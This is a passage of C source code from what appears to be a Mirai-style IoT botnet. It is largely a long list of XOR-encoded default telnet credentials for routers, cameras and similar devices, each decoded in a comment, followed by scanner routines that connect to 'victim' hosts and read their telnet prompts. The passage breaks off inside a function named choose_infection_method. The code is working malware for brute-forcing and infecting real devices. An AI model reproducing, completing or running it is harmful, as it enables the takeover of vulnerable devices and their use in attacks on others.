    current->next = ptr;
    current = ptr;
    max_credentials++;
    #ifdef DEBUG
        //printf("[entry/%d/login] Loaded login %s:%s\n", weight, ptr->username, ptr->password);
    #endif
}

static void init_logins(void)
{
    // root:Admin
    load_login(10, "\x75\x68\x68\x73", "\x46\x63\x6A\x6E\x69");
    // root:solokey
    load_login(10, "\x75\x68\x68\x73", "\x74\x68\x6B\x68\x6C\x62\x7E");
    // root:colorkey
    load_login(10, "\x75\x68\x68\x73", "\x64\x68\x6B\x68\x75\x6C\x62\x7E");
    // root tsgoingon
    load_login(10, "\x75\x68\x68\x73", "\x73\x74\x60\x68\x6E\x69\x60\x68\x69\x07");
    // root taZz@23495859
    load_login(10, "\x75\x68\x68\x73", "\x73\x66\x5D\x7D\x47\x35\x34\x33\x3E\x32\x3F\x32\x3E\x07");
    // root aquario
    load_login(10, "\x75\x68\x68\x73", "\x66\x76\x72\x66\x75\x6E\x68");
    // admin aquario
    load_login(9, "\x66\x63\x6A\x6E\x69", "\x66\x76\x72\x66\x75\x6E\x68");
    // root xc3511
    load_login(9, "\x75\x68\x68\x73", "\x7F\x64\x34\x32\x36\x36");
    // root 20080826
    load_login(9, "\x75\x68\x68\x73", "\x35\x37\x37\x3F\x37\x3F\x35\x31");
    // root ahetzip8
    load_login(9, "\x75\x68\x68\x73", "\x66\x6F\x62\x73\x7D\x6E\x77\x3F");
    // root 
    load_login(9, "\x75\x68\x68\x73", "");
    // root vizxv
    load_login(9, "\x75\x68\x68\x73", "\x71\x6E\x7D\x7F\x71");
    // root:changeme
    load_login(8, "\x75\x68\x68\x73", "\x64\x6F\x66\x69\x60\x62\x6A\x62");
    // admin:changeme
    load_login(8, "\x66\x63\x6A\x6E\x69", "\x64\x6F\x66\x69\x60\x62\x6A\x62");
    // root antslq
    load_login(8, "\x75\x68\x68\x73", "\x66\x69\x73\x74\x6B\x76");
    // root hunt5759
    load_login(8, "\x75\x68\x68\x73", "\x6F\x72\x69\x73\x32\x30\x32\x3E");
    // root alpine
    load_login(8, "\x75\x68\x68\x73", "\x66\x6B\x77\x6E\x69\x62");
    // root 1001chin
    load_login(8, "\x75\x68\x68\x73", "\x36\x37\x37\x36\x64\x6F\x6E\x69");
    // admin:samsung
    load_login(8, "\x66\x63\x6A\x6E\x69", "\x74\x66\x6A\x74\x72\x69\x60");
    // root 5up
    load_login(7, "\x75\x68\x68\x73", "\x32\x72\x77");
    // root ipcam_rt5350
    load_login(7, "\x75\x68\x68\x73", "\x6E\x77\x64\x66\x6A\x58\x75\x73\x32\x34\x32\x37");
    // root 1
    load_login(7, "\x75\x68\x68\x73", "\x36");
    // root:fidel123
    load_login(7, "\x75\x68\x68\x73", "\x61\x6E\x63\x62\x6B\x36\x35\x34");
    // default:
    load_login(7, "\x63\x62\x61\x66\x72\x6B\x73", "");
    // default:default
    load_login(7, "\x63\x62\x61\x66\x72\x6B\x73", "\x63\x62\x61\x66\x72\x6B\x73");
    // root:swsbzkgn
    load_login(7, "\x75\x68\x68\x73", "\x74\x70\x74\x65\x7D\x6C\x60\x69");
    // root:sipwise
    load_login(7, "\x75\x68\x68\x73", "\x74\x6E\x77\x70\x6E\x74\x62");
    // root:sixaola
    load_login(7, "\x75\x68\x68\x73", "\x74\x6E\x7F\x66\x68\x6B\x66");
    // root:stxadmin
    load_login(7, "\x75\x68\x68\x73", "\x74\x73\x7F\x66\x63\x6A\x6E\x69");
    // root:hslwificam
    load_login(7, "\x75\x68\x68\x73", "\x6F\x74\x6B\x70\x6E\x61\x6E\x64\x66\x6A");
    // root:zksoft3
    load_login(7, "\x75\x68\x68\x73", "\x7D\x6C\x74\x68\x61\x73\x34");
    // root 123123
    load_login(7, "\x75\x68\x68\x73", "\x36\x35\x34\x36\x35\x34");
    // root 1234qwer
    load_login(7, "\x75\x68\x68\x73", "\x36\x35\x34\x33\x76\x70\x62\x75");
    // root root
    load_login(7, "\x75\x68\x68\x73", "\x75\x68\x68\x73");
    // adm 
    load_login(7, "\x66\x63\x6A", "");
    // root oelinux123
    load_login(7, "\x75\x68\x68\x73", "\x68\x62\x6B\x6E\x69\x72\x7F\x36\x35\x34");
    // root oelinux1234
    load_login(7, "\x75\x68\x68\x73", "\x68\x62\x6B\x6E\x69\x72\x7F\x36\x35\x34\x33");
    // root ivdev
    load_login(7, "\x75\x68\x68\x73", "\x6E\x71\x63\x62\x71");
    // root ttnet
    load_login(7, "\x75\x68\x68\x73", "\x73\x73\x69\x62\x73");
    // hikvision:hikvision
	load_login(7, "\x6F\x6E\x6C\x71\x6E\x74\x6E\x68\x69", "\x6F\x6E\x6C\x71\x6E\x74\x6E\x68\x69");
	// root:icatch99
	load_login(7, "\x75\x68\x68\x73", "\x6E\x64\x66\x73\x64\x6F\x3E\x3E");
	// root:fxjvt1805
	load_login(7, "\x75\x68\x68\x73", "\x61\x7F\x6D\x71\x73\x36\x3F\x37\x32");
	// root:zte
	load_login(7, "\x75\x68\x68\x73", "\x7D\x73\x62");
	// root:glasshou
	load_login(7, "\x75\x68\x68\x73", "\x60\x6B\x66\x74\x74\x6F\x68\x72");
	// root:QwestM0dem
	load_login(7, "\x75\x68\x68\x73", "\x56\x70\x62\x74\x73\x4A\x37\x63\x62\x6A");
	// root:gpon
	load_login(7, "\x75\x68\x68\x73", "\x60\x77\x68\x69");
    // admin 5up
    load_login(7, "\x66\x63\x6A\x6E\x69", "\x32\x72\x77");
    // Admin 5up
    load_login(7, "\x66\x63\x6A\x6E\x69", "\x32\x72\x77");
    // Admin 
    load_login(7, "\x66\x63\x6A\x6E\x69", "");
    // admin ttnet
    load_login(7, "\x66\x63\x6A\x6E\x69", "\x73\x73\x69\x62\x73");
    // admin 123123
    load_login(7, "\x66\x63\x6A\x6E\x69", "\x36\x35\x34\x36\x35\x34");
    // admin 12341234
    load_login(7, "\x66\x63\x6A\x6E\x69", "\x36\x35\x34\x33\x36\x35\x34\x33");
    // admin ho4uku6at
    load_login(7, "\x66\x63\x6A\x6E\x69", "\x6F\x68\x33\x72\x6C\x72\x31\x66\x73");
    // admin root
    load_login(7, "\x66\x63\x6A\x6E\x69", "\x75\x68\x68\x73");
    // admin system
    load_login(7, "\x66\x63\x6A\x6E\x69", "\x74\x7E\x74\x73\x62\x6A");
    // admin linga
    load_login(7, "\x66\x63\x6A\x6E\x69", "\x6B\x6E\x69\x60\x66");
    // adfexc adfexc
    load_login(7, "\x66\x63\x61\x62\x7F\x64", "\x66\x63\x61\x62\x7F\x64");
    // installer installer
    load_login(7, "\x6E\x69\x74\x73\x66\x6B\x6B\x62\x75", "\x6E\x69\x74\x73\x66\x6B\x6B\x62\x75");
    // admin 362729
    load_login(7, "\x66\x63\x6A\x6E\x69", "\x34\x31\x35\x30\x35\x3E");
    // telecomadmin nE7jA%5m
    load_login(7, "\x73\x62\x6B\x62\x64\x68\x6A\x66\x63\x6A\x6E\x69", "\x69\x42\x30\x6D\x46\x22\x32\x6A");
    // root t0talc0ntr0l4!
    load_login(7, "\x75\x68\x68\x73", "\x73\x37\x73\x66\x6B\x64\x37\x69\x73\x75\x37\x6B\x33\x26");
    // root GM8182
    load_login(7, "\x75\x68\x68\x73", "\x40\x4A\x3F\x36\x3F\x35");
    // root zyad1234
    load_login(6, "\x75\x68\x68\x73", "\x7D\x7E\x66\x63\x36\x35\x34\x33");
    // root 1234567890
    load_login(6, "\x75\x68\x68\x73", "\x36\x35\x34\x33\x32\x31\x30\x3F\x3E\x37");
    // root 1988
    load_login(6, "\x75\x68\x68\x73", "\x36\x3E\x3F\x3F");
    // root:linuxshell
    load_login(6, "\x75\x68\x68\x73", "\x6B\x6E\x69\x72\x7F\x74\x6F\x62\x6B\x6B");
    // root:tini
    load_login(6, "\x75\x68\x68\x73", "\x73\x6E\x69\x6E");
    // root:calvin
    load_login(6, "\x75\x68\x68\x73", "\x64\x66\x6B\x71\x6E\x69");
    // root:blender
    load_login(6, "\x75\x68\x68\x73", "\x65\x6B\x62\x69\x63\x62\x75");
    // root:hipc3518
    load_login(6, "\x75\x68\x68\x73", "\x6F\x6E\x77\x64\x34\x32\x36\x3F");
    // root:2011vsta
    load_login(6, "\x75\x68\x68\x73", "\x35\x37\x36\x36\x71\x74\x73\x66");
    // root:timeserver
    load_login(6, "\x75\x68\x68\x73", "\x73\x6E\x6A\x62\x74\x62\x75\x71\x62\x75");
    // root:TrippLite
    load_login(6, "\x75\x68\x68\x73", "\x53\x75\x6E\x77\x77\x4B\x6E\x73\x62");
    // root zhongxing
    load_login(6, "\x75\x68\x68\x73", "\x7D\x6F\x68\x69\x60\x7F\x6E\x69\x60");
    // root cat1029
    load_login(6, "\x75\x68\x68\x73", "\x64\x66\x73\x36\x37\x35\x3E");
    // root 12341234
    load_login(6, "\x75\x68\x68\x73", "\x36\x35\x34\x33\x36\x35\x34\x33");
    // daemon 
    load_login(6, "\x63\x66\x62\x6A\x68\x69", "");
    // root:huigu309
    load_login(6, "\x75\x68\x68\x73", "\x6F\x72\x6E\x60\x72\x34\x37\x3E");
    // root:leostream
    load_login(6, "\x75\x68\x68\x73", "\x6B\x62\x68\x74\x73\x75\x62\x66\x6A");
    // root:Admin
    load_login(6, "\x75\x68\x68\x73", "\x46\x63\x6A\x6E\x69");
    // root:letacla
    load_login(6, "\x75\x68\x68\x73", "\x6B\x62\x73\x66\x64\x6B\x66");
    // root:zyad5001
	load_login(6, "\x75\x68\x68\x73", "\x7D\x7E\x66\x63\x32\x37\x37\x36");
	// root:annie2012
	load_login(6, "\x75\x68\x68\x73", "\x66\x69\x69\x6E\x62\x35\x37\x36\x35");
	// root:GEPON
	load_login(6, "\x75\x68\x68\x73", "\x40\x42\x57\x48\x49");
    // root:vhd1206
    load_login(6, "\x75\x68\x68\x73", "\x71\x6F\x63\x36\x35\x37\x31");
    // root:059AnkJ
    load_login(6, "\x75\x68\x68\x73", "\x37\x32\x3E\x46\x69\x6C\x4D");
    // root:e10adc39
    load_login(6, "\x75\x68\x68\x73", "\x62\x36\x37\x66\x63\x64\x34\x3E");
    // mg3500 merlin
    load_login(6, "\x6A\x60\x34\x32\x37\x37", "\x6A\x62\x75\x6B\x6E\x69");
    // root qazxsw
    load_login(5, "\x75\x68\x68\x73", "\x76\x66\x7D\x7F\x74\x70");
    // root:grouter
    load_login(5, "\x75\x68\x68\x73", "\x60\x75\x68\x72\x73\x62\x75");
    // root vertex25ektks123
    load_login(5, "\x75\x68\x68\x73", "\x71\x62\x75\x73\x62\x7F\x35\x32\x62\x6C\x73\x6C\x74\x36\x35\x34");
    // root zsun1188
    load_login(5, "\x75\x68\x68\x73", "\x7D\x74\x72\x69\x36\x36\x3F\x3F");
    // root 12345
    load_login(5, "\x75\x68\x68\x73", "\x36\x35\x34\x33\x32");
    // root 123456
    load_login(5, "\x75\x68\x68\x73", "\x36\x35\x34\x33\x32\x31");
    // root 888888
    load_login(5, "\x75\x68\x68\x73", "\x3F\x3F\x3F\x3F\x3F\x3F");
    // root xmhdipc
    load_login(5, "\x75\x68\x68\x73", "\x7F\x6A\x6F\x63\x6E\x77\x64");
    // root:h3c
    load_login(5, "\x75\x68\x68\x73", "\x6F\x34\x64");
    // root:ipc71a
    load_login(5, "\x75\x68\x68\x73", "\x6E\x77\x64\x30\x36\x66");
    // root:IPCam@sw
    load_login(5, "\x75\x68\x68\x73", "\x4E\x57\x44\x66\x6A\x47\x74\x70");
    // root:cms500
    load_login(5, "\x75\x68\x68\x73", "\x64\x6A\x74\x32\x37\x37");
    // admin:CenturyL1nk
	load_login(5, "\x66\x63\x6A\x6E\x69", "\x44\x62\x69\x73\x72\x75\x7E\x4B\x36\x69\x6C");
    // admin:isp
    load_login(5, "\x66\x63\x6A\x6E\x69", "\x6E\x74\x77");
    // admin:3333333
    load_login(5, "\x66\x63\x6A\x6E\x69", "\x34\x34\x34\x34\x34\x34\x34");
    // root:bin
    load_login(5, "\x75\x68\x68\x73", "\x65\x6E\x69");
	// ispadmin:ispadmin
	load_login(5, "\x6E\x74\x77\x66\x63\x6A\x6E\x69", "\x6E\x74\x77\x66\x63\x6A\x6E\x69");
	// root:CTLsupport12
	load_login(5, "\x75\x68\x68\x73", "\x44\x53\x4B\x74\x72\x77\x77\x68\x75\x73\x36\x35");
	// admin:v2mprt
	load_login(5, "\x66\x63\x6A\x6E\x69", "\x71\x35\x6A\x77\x75\x73");
	// admin:vsONU101
	load_login(5, "\x66\x63\x6A\x6E\x69", "\x71\x74\x48\x49\x52\x36\x37\x36");
    // root:bananapi
    load_login(5, "\x75\x68\x68\x73", "\x65\x66\x69\x66\x69\x66\x77\x6E");
    // root:nokia
    load_login(5, "\x75\x68\x68\x73", "\x69\x68\x6C\x6E\x66");
    // bin 
    load_login(5, "\x65\x6E\x69", "");
    // root 54321
    load_login(5, "\x75\x68\x68\x73", "\x32\x33\x34\x35\x36");
    // root 1111
    load_login(4, "\x75\x68\x68\x73", "\x36\x36\x36\x36");
    // admin:default
    load_login(4, "\x66\x63\x6A\x6E\x69", "\x63\x62\x61\x66\x72\x6B\x73");
    // root:swsbzkgn
    load_login(4, "\x75\x68\x68\x73", "\x74\x70\x74\x65\x7D\x6C\x60\x69");
    // root:888888888
	load_login(4, "\x75\x68\x68\x73", "\x3F\x3F\x3F\x3F\x3F\x3F\x3F\x3F\x3F");
	// root:0
	load_login(4, "\x75\x68\x68\x73", "\x37");
	// admin:localhost
	load_login(4, "\x66\x63\x6A\x6E\x69", "\x6B\x68\x64\x66\x6B\x6F\x68\x74\x73");
	// root:vortex25
	load_login(4, "\x75\x68\x68\x73", "\x71\x68\x75\x73\x62\x7F\x35\x32");
	// nexxadmin:y1n2inc.com0755
	load_login(4, "\x69\x62\x7F\x7F\x66\x63\x6A\x6E\x69", "\x7E\x36\x69\x35\x6E\x69\x64\x29\x64\x68\x6A\x37\x30\x32\x32");
	// telnetadmin:telnetadmin
	load_login(4, "\x73\x62\x6B\x69\x62\x73\x66\x63\x6A\x6E\x69", "\x73\x62\x6B\x69\x62\x73\x66\x63\x6A\x6E\x69");
	// root:dnsekakf2$$
	load_login(4, "\x75\x68\x68\x73", "\x63\x69\x74\x62\x6C\x66\x6C\x61\x35\x36\x3E\x31\x32\x36");
	// CUAdmin:CUAdmin
	load_login(4, "\x44\x52\x46\x63\x6A\x6E\x69", "\x44\x52\x46\x63\x6A\x6E\x69");
    // root:zte9x15
    load_login(4, "\x75\x68\x68\x73", "\x7D\x73\x62\x3E\x7F\x36\x32");
    // root:juantech
    load_login(4, "\x75\x68\x68\x73", "\x6D\x72\x66\x69\x73\x62\x64\x6F");
    // root:davox
    load_login(4, "\x75\x68\x68\x73", "\x63\x66\x71\x68\x7F");
    // Admin:Admin
    load_login(4, "\x46\x63\x6A\x6E\x69", "\x46\x63\x6A\x6E\x69");
    // teladmin:hacktheworld1337
    load_login(4, "\x73\x62\x6B\x66\x63\x6A\x6E\x69", "\x6F\x66\x64\x6C\x73\x6F\x62\x70\x68\x75\x6B\x63\x36\x34\x34\x30");
    // root:telecomadmin
    load_login(4, "\x75\x68\x68\x73", "\x73\x62\x6B\x62\x64\x68\x6A\x66\x63\x6A\x6E\x69");
    // root:hg2x0
    load_login(4, "\x75\x68\x68\x73", "\x6F\x60\x35\x7F\x37");
    // root:hichiphx
    load_login(4, "\x75\x68\x68\x73", "\x6F\x6E\x64\x6F\x6E\x77\x6F\x7F");
    // root:apix
    load_login(4, "\x75\x68\x68\x73", "\x66\x77\x6E\x7F");
    // root smcadmin
    load_login(4, "\x75\x68\x68\x73", "\x74\x6A\x64\x66\x63\x6A\x6E\x69");
    // root 666666
    load_login(4, "\x75\x68\x68\x73", "\x31\x31\x31\x31\x31\x31");
    // root klv123
    load_login(4, "\x75\x68\x68\x73", "\x6C\x6B\x71\x36\x35\x34");
    // root klv1234
    load_login(4, "\x75\x68\x68\x73", "\x6C\x6B\x71\x36\x35\x34\x33");
    // root Zte521
    load_login(4, "\x75\x68\x68\x73", "\x5D\x73\x62\x32\x35\x36");
    // root hi3518
    load_login(4, "\x75\x68\x68\x73", "\x6F\x6E\x34\x32\x36\x3F");
    // root jvbzd
    load_login(3, "\x75\x68\x68\x73", "\x6D\x71\x65\x7D\x63");
    // root anko
    load_login(3, "\x75\x68\x68\x73", "\x66\x69\x6C\x68");
    // root zlxx.
    load_login(3, "\x75\x68\x68\x73", "\x7D\x6B\x7F\x7F\x29");
    // root:ceadmin
    load_login(3, "\x75\x68\x68\x73", "\x64\x62\x66\x63\x6A\x6E\x69");
    // root:Cisco
    load_login(3, "\x75\x68\x68\x73", "\x44\x6E\x74\x64\x68");
    // root:iDirect
    load_login(3, "\x75\x68\x68\x73", "\x6E\x43\x6E\x75\x62\x64\x73");
    // root:hdipc%No
    load_login(3, "\x75\x68\x68\x73", "\x6F\x63\x6E\x77\x64\x22\x49\x68");
    // root founder88
    load_login(3, "\x75\x68\x68\x73", "\x61\x68\x72\x69\x63\x62\x75\x3F\x3F");
    // root 7ujMko0vizxv
    load_login(3, "\x75\x68\x68\x73", "\x30\x72\x6D\x4A\x6C\x68\x37\x71\x6E\x7D\x7F\x71");
    // root 7ujMko0admin
    load_login(3, "\x75\x68\x68\x73", "\x30\x72\x6D\x4A\x6C\x68\x37\x66\x63\x6A\x6E\x69");
    // root system
    load_login(3, "\x75\x68\x68\x73", "\x74\x7E\x74\x73\x62\x6A");
    // root:!root
    load_login(3, "\x75\x68\x68\x73", "\x26\x75\x68\x68\x73");
    // root ikwb
    load_login(3, "\x75\x68\x68\x73", "\x6E\x6C\x70\x65");
    // root dreambox
    load_login(3, "\x75\x68\x68\x73", "\x63\x75\x62\x66\x6A\x65\x68\x7F");
    // root realtek
    load_login(3, "\x75\x68\x68\x73", "\x75\x62\x66\x6B\x73\x62\x6C");
    // root 1111111
    load_login(3, "\x75\x68\x68\x73", "\x36\x36\x36\x36\x36\x36\x36");
    // bin:bin
	load_login(3, "\x65\x6E\x69", "\x65\x6E\x69");
	// admin:444
	load_login(3, "\x66\x63\x6A\x6E\x69", "\x33\x33\x33");
	// root:55555555
	load_login(3, "\x75\x68\x68\x73", "\x32\x32\x32\x32\x32\x32\x32\x32");
	// root:111111
	load_login(3, "\x75\x68\x68\x73", "\x36\x36\x36\x36\x36\x36");
	// root:111111111
	load_login(3, "\x75\x68\x68\x73", "\x36\x36\x36\x36\x36\x36\x36\x36\x36");
	// admin:77
	load_login(3, "\x66\x63\x6A\x6E\x69", "\x30\x30");
	// root:9999
	load_login(3, "\x75\x68\x68\x73", "\x3E\x3E\x3E\x3E");
	// admin:55
	load_login(3, "\x66\x63\x6A\x6E\x69", "\x32\x32");
    // e8ehome1:e8ehome1
    load_login(3, "\x62\x3F\x62\x6F\x68\x6A\x62\x36", "\x62\x3F\x62\x6F\x68\x6A\x62\x36");
    // e8telnet:e8telnet
    load_login(3, "\x62\x3F\x73\x62\x6B\x69\x62\x73", "\x62\x3F\x73\x62\x6B\x69\x62\x73");
    // localadmin:localadmin
    load_login(3, "\x6B\x68\x64\x66\x6B\x66\x63\x6A\x6E\x69", "\x6B\x68\x64\x66\x6B\x66\x63\x6A\x6E\x69");
	// root:99999
	load_login(3, "\x75\x68\x68\x73", "\x3E\x3E\x3E\x3E\x3E");
	// root:222
	load_login(3, "\x75\x68\x68\x73", "\x35\x35\x35");
	// root:55555
	load_login(3, "\x75\x68\x68\x73", "\x32\x32\x32\x32\x32");
	// root:33333
	load_login(3, "\x75\x68\x68\x73", "\x34\x34\x34\x34\x34");
	// root:777
	load_login(3, "\x75\x68\x68\x73", "\x30\x30\x30");
	// root:7777777
	load_login(3, "\x75\x68\x68\x73", "\x30\x30\x30\x30\x30\x30\x30");
	// admin:000
	load_login(3, "\x66\x63\x6A\x6E\x69", "\x37\x37\x37");
	// root:8888
	load_login(3, "\x75\x68\x68\x73", "\x3F\x3F\x3F\x3F");
    // root 123
    load_login(3, "\x75\x68\x68\x73", "\x36\x35\x34");
    // root 1234
    load_login(3, "\x75\x68\x68\x73", "\x36\x35\x34\x33");
    // root password
    load_login(2, "\x75\x68\x68\x73", "\x77\x66\x74\x74\x70\x68\x75\x63");
   	// root:444
	load_login(2, "\x75\x68\x68\x73", "\x33\x33\x33");
	// root:6666666
	load_login(2, "\x75\x68\x68\x73", "\x31\x31\x31\x31\x31\x31\x31");
	// root:555555555
	load_login(2, "\x75\x68\x68\x73", "\x32\x32\x32\x32\x32\x32\x32\x32\x32");
	// root:888888
	load_login(2, "\x75\x68\x68\x73", "\x3F\x3F\x3F\x3F\x3F\x3F");
	// admin:2222
	load_login(2, "\x66\x63\x6A\x6E\x69", "\x35\x35\x35\x35");
    // root default
    load_login(2, "\x75\x68\x68\x73", "\x63\x62\x61\x66\x72\x6B\x73");
    // root pass
    load_login(2, "\x75\x68\x68\x73", "\x77\x66\x74\x74");
    // root 00000000
    load_login(2, "\x75\x68\x68\x73", "\x37\x37\x37\x37\x37\x37\x37\x37");
    // root user
    load_login(2, "\x75\x68\x68\x73", "\x72\x74\x62\x75");
    // root admin
    load_login(2, "\x75\x68\x68\x73", "\x66\x63\x6A\x6E\x69");
    // admin admin
    load_login(2, "\x66\x63\x6A\x6E\x69", "\x66\x63\x6A\x6E\x69");
    // admin password
    load_login(2, "\x66\x63\x6A\x6E\x69", "\x77\x66\x74\x74\x70\x68\x75\x63");
    // admin 
    load_login(2, "\x66\x63\x6A\x6E\x69", "");
    // root:3ep5w2u
    load_login(2, "\x75\x68\x68\x73", "\x34\x62\x77\x32\x70\x35\x72");
    // root:Mau'dib
    load_login(2, "\x75\x68\x68\x73", "\x4A\x66\x72\x20\x63\x6E\x65");
    // root:wyse
    load_login(2, "\x75\x68\x68\x73", "\x70\x7E\x74\x62");
    // root:warmWLspot
    load_login(2, "\x75\x68\x68\x73", "\x70\x66\x75\x6A\x50\x4B\x74\x77\x68\x73");
    // admin admin1234
    load_login(2, "\x66\x63\x6A\x6E\x69", "\x66\x63\x6A\x6E\x69\x36\x35\x34\x33");
    // admin smcadmin
    load_login(2, "\x66\x63\x6A\x6E\x69", "\x74\x6A\x64\x66\x63\x6A\x6E\x69");
    // admin 1111
    load_login(2, "\x66\x63\x6A\x6E\x69", "\x36\x36\x36\x36");
    // admin1 password
    load_login(1, "\x66\x63\x6A\x6E\x69\x36", "\x77\x66\x74\x74\x70\x68\x75\x63");
    // administrator 1234
    load_login(1, "\x66\x63\x6A\x6E\x69\x6E\x74\x73\x75\x66\x73\x68\x75", "\x36\x35\x34\x33");
    // admin 1111111
    load_login(1, "\x66\x63\x6A\x6E\x69", "\x36\x36\x36\x36\x36\x36\x36");
    // admin 123
    load_login(1, "\x66\x63\x6A\x6E\x69", "\x36\x35\x34");
    // admin 1234
    load_login(1, "\x66\x63\x6A\x6E\x69", "\x36\x35\x34\x33");
    // admin 12345
    load_login(1, "\x66\x63\x6A\x6E\x69", "\x36\x35\x34\x33\x32");
    // admin 54321
    load_login(1, "\x66\x63\x6A\x6E\x69", "\x32\x33\x34\x35\x36");
    // admin 123456
    load_login(1, "\x66\x63\x6A\x6E\x69", "\x36\x35\x34\x33\x32\x31");
    // admin 7ujMko0admin
    load_login(1, "\x66\x63\x6A\x6E\x69", "\x30\x72\x6D\x4A\x6C\x68\x37\x66\x63\x6A\x6E\x69");
    // admin ipcam_rt5350
    load_login(1, "\x66\x63\x6A\x6E\x69", "\x6E\x77\x64\x66\x6A\x58\x75\x73\x32\x34\x32\x37");
    // admin 1
    load_login(1, "\x66\x63\x6A\x6E\x69", "\x36");
    // telnet telnet
    load_login(1, "\x73\x62\x6B\x69\x62\x73", "\x73\x62\x6B\x69\x62\x73");
    // support support
    load_login(1, "\x74\x72\x77\x77\x68\x75\x73", "\x74\x72\x77\x77\x68\x75\x73");
    // bin 
    load_login(1, "\x65\x6E\x69", "");
    // admin zhongxing
    load_login(1, "\x66\x63\x6A\x6E\x69", "\x7D\x6F\x68\x69\x60\x7F\x6E\x69\x60");
    // admin 1234567890
    load_login(1, "\x66\x63\x6A\x6E\x69", "\x36\x35\x34\x33\x32\x31\x30\x3F\x3E\x37");
    // admin 1988
    load_login(1, "\x66\x63\x6A\x6E\x69", "\x36\x3E\x3F\x3F");
    // root:LSiuY7pOmZG2s
    load_login(1, "\x75\x68\x68\x73", "\x4B\x54\x6E\x72\x5E\x30\x77\x48\x6A\x5D\x40\x35\x74");
    // root:linux
    load_login(1, "\x75\x68\x68\x73", "\x6B\x6E\x69\x72\x7F");
    // root:ROOT500
    load_login(1, "\x75\x68\x68\x73", "\x55\x48\x48\x53\x32\x37\x37");
    // root:rootroot
    load_login(1, "\x75\x68\x68\x73", "\x75\x68\x68\x73\x75\x68\x68\x73");
    // admin zsun1188
    load_login(1, "\x66\x63\x6A\x6E\x69", "\x7D\x74\x72\x69\x36\x36\x3F\x3F");
    // user user
    load_login(1, "\x72\x74\x62\x75", "\x72\x74\x62\x75");
    // guest guest
    load_login(1, "\x60\x72\x62\x74\x73", "\x60\x72\x62\x74\x73");
    // guest 12345
    load_login(1, "\x60\x72\x62\x74\x73", "\x36\x35\x34\x33\x32");
    // guest 
    load_login(1, "\x60\x72\x62\x74\x73", "");
    // ubnt ubnt
    load_login(1, "\x72\x65\x69\x73", "\x72\x65\x69\x73");
    // service service
    load_login(1, "\x74\x62\x75\x71\x6E\x64\x62", "\x74\x62\x75\x71\x6E\x64\x62");
    // 666666 666666
    load_login(1, "\x31\x31\x31\x31\x31\x31", "\x31\x31\x31\x31\x31\x31");
    // 888888 888888
    load_login(1, "\x3F\x3F\x3F\x3F\x3F\x3F", "\x3F\x3F\x3F\x3F\x3F\x3F");
	// root:444444444
	load_login(1, "\x75\x68\x68\x73", "\x33\x33\x33\x33\x33\x33\x33\x33\x33");
	// ubnt:1234
	load_login(1, "\x72\x65\x69\x73", "\x36\x35\x34\x33");
	// dnsekakf2$$:
	load_login(1, "\x63\x69\x74\x62\x6C\x66\x6C\x61\x35\x36\x3E\x31\x32\x36", "");
	// guest:1234
	load_login(1, "\x60\x72\x62\x74\x73", "\x36\x35\x34\x33");
	// guest:123456
	load_login(1, "\x60\x72\x62\x74\x73", "\x36\x35\x34\x33\x32\x31");
	// root:9
	load_login(1, "\x75\x68\x68\x73", "\x3E");
}

static void process_all_retrieve_lines(void)
{
    int i = 0;
    struct retrieve_bin_t *retrbin = &retr_bins[0];

    while(retrbin)
    {
        if(i == retrbin_count)
            break;

        if(retrbin->retr_line_num == 0)
            process_retrieve_lines(retrbin);

        retrbin++;
        i++;
    }
}

static void setup_connection(struct scanner_struct_t *ptr)
{
    struct sockaddr_in addr = {0};

    if(ptr->fd != -1)
        close(ptr->fd);

    if((ptr->fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
        return;

    ptr->rdbuf_pos = 0;
    memset(ptr->sockbuf, 0, sizeof(ptr->sockbuf));
    // 5 second initial connection timeout
    ptr->timeout = 5;

    fcntl(ptr->fd, F_SETFL, O_NONBLOCK | fcntl(ptr->fd, F_GETFL, 0));

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = ptr->dst_addr;
    addr.sin_port = ptr->dst_port;

    ptr->last_recv = fake_time;
    ptr->state = SC_CONNECTING;

    connect(ptr->fd, (struct sockaddr_in *)&addr, sizeof(addr));
}

static BOOL multiple_read_until(int id, struct scanner_struct_t *ptr)
{
    memset(ptr->sockbuf, 0, SOCKBUF_SIZE);

    fd_set read_set;
    struct timeval timeout;
    int ret = 0;
    uint8_t *ptr2 = ptr->sockbuf;

    timeout.tv_sec = 0;
    timeout.tv_usec = 100;

    FD_ZERO(&read_set);
    FD_SET(ptr->fd, &read_set);

    ret = select(ptr->fd + 1, &read_set, NULL, NULL, &timeout);
    if(ret < 1)
        return FALSE;
    
    ret = recv(ptr->fd, ptr->sockbuf, SOCKBUF_SIZE, 0);
    if(ret < 1)
        return FALSE;

    if(*ptr2 == 0xff && !ptr->got_iac)
    {
        #ifdef DEBUG
        	//printf("[telnet scan/%d] IAC negotiation? - %s\n", ptr->fd, get_victim_host(ptr));
        #endif
        ret = iac_negotiate(ptr);
        if(!ret)
        {
            #ifdef DEBUG
                //printf("[telnet scan/%d] Failed to negotiate with IAC - %s\n", ptr->fd, get_victim_host(ptr));
            #endif
            return 0;
        }
        #ifdef DEBUG
            //printf("[telnet scan/%d] IAC negotiation success - %s\n", ptr->fd, get_victim_host(ptr));
        #endif
        ptr->got_iac = TRUE;
    }

    if(compare_telnet_prompts(id, ptr))
    {
    	//#ifdef DEBUG
            //printf("[telnet scan/%d] telnet prompt matched - %s\n", ptr->fd, get_victim_host(ptr));
        //#endif
        return 1;
    }
    //#ifdef DEBUG
        //printf("[telnet scan/%d] failed prompt matched - %s\n", ptr->fd, get_victim_host(ptr));
    //#endif

    return 0;
}

static int single_read_until(struct scanner_struct_t *ptr, char *string)
{
    memset(ptr->sockbuf, 0, SOCKBUF_SIZE);

    fd_set read_set;
    struct timeval timeout;
    int ret = 0;
    
    timeout.tv_sec = 0;
    timeout.tv_usec = 100;

    FD_ZERO(&read_set);
    FD_SET(ptr->fd, &read_set);

    ret = select(ptr->fd + 1, &read_set, NULL, NULL, &timeout);
    if(ret < 1)
        return FALSE;
    
    ret = recv(ptr->fd, ptr->sockbuf, SOCKBUF_SIZE, MSG_NOSIGNAL);
    if(ret < 1)
        return FALSE;

    ret = util_char_search(ptr->sockbuf, SOCKBUF_SIZE, string, util_strlen(string));
    if(ret != -1)
    {
        return ret;
    }

    return FALSE;
}

static BOOL choose_infection_method(struct scanner_struct_t *ptr, int timeout_sec)
{
    memset(ptr->sockbuf, 0, SOCKBUF_SIZE);

    fd_set read_set;
    struct timeval timeout;
    int ret = 0;
    char *str;

    timeout.tv_sec = 0;
    timeout.tv_usec = 100;
    
    FD_ZERO(&read_set);
